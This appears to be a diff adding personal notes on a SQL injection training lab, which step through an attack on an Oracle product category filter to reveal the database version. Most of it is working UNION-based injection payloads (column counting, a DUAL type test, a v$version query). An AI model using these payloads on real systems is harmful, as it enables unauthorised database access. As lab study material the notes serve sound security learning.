@@ -1,0 +1,17 @@
+Lab-07 - SQL Injection attack, querying the database type and version on Oracle
+
+SQL Injection - Product Category Filter
+
+End Goal - Display the database version string
+
+Analysis:
+
+1) Determing the number of columns
+SQLi Payload : ' order by 1--
+Result : 2 Columns as ' order by 3-- -> Internal Server Error
+
+2) Determine the data types of the columns
+SQLi Payload : ' UNION SELECT 'a', 'a' from DUAL-- -> Oracle database
+
+3) Output the version of the database
+SQLi Payload : ' UNION select banner, NULL from v$version--
